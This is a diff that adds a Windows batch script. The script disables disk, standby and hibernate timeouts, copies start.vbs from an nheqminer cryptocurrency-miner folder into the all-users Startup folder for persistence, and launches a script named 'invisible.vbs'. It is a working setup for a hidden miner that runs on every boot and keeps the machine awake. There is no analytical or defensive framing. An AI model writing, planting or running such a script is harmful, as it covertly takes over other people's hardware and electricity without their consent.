@@ -1,0 +1,10 @@
+c:\windows\system32\powercfg.exe -change -disk-timeout-ac 0
+c:\windows\system32\powercfg.exe -change -disk-timeout-dc 0
+c:\windows\system32\powercfg.exe -change -standby-timeout-ac 0
+c:\windows\system32\powercfg.exe -change -standby-timeout-dc 0
+c:\windows\system32\powercfg.exe -change -hibernate-timeout-ac 0
+c:\windows\system32\powercfg.exe -change -hibernate-timeout-dc 0
+copy C:\Windows_x64_nheqminer-5c\start.vbs C:\ProgramData\Microsoft\Windows\Start" "Menu\Programs\StartUp\
+cd..
+cd \Windows_x64_nheqminer-5c
+start invisible.vbs
